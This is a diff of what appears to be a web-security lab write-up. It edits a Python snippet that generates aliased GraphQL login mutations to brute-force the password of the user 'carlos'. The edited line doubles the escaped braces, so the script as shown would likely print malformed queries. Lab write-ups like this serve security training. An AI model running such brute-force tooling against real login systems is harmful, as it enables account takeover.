@@ -577,12 +577,13 @@ To get the password of carlos
 
 
 ```python
+
 passwords = "123456,password,12345678,qwerty".split(',')
 
 mutations = []
 for index, element in enumerate(passwords):
     mutation = (
-        f"bruteforce{index}: login(input: {{ password: \"{element}\", username: \"carlos\" }}) {{\n"
+        f"bruteforce{index}: login(input: {{{{ password: \"{element}\", username: \"carlos\" }}}}) {{\n"
         "    token\n"
         "    success\n"
         "}\n"
@@ -591,6 +592,7 @@ for index, element in enumerate(passwords):
 
 query = "\n".join(mutations)
 print(query)
+
 
 ```
 
@@ -676,6 +678,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
